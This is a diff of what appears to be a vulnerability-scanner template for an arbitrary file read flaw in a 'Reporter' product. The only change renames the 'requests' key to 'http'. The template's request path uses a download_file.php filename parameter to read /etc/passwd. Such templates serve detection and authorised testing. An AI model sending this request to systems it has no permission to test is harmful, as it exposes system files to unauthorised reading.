@@ -6,7 +6,7 @@ info:
   severity: high
   tags: Reporter,fileRead
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/view/action/download_file.php?filename=/etc/passwd&savename=query.xls"
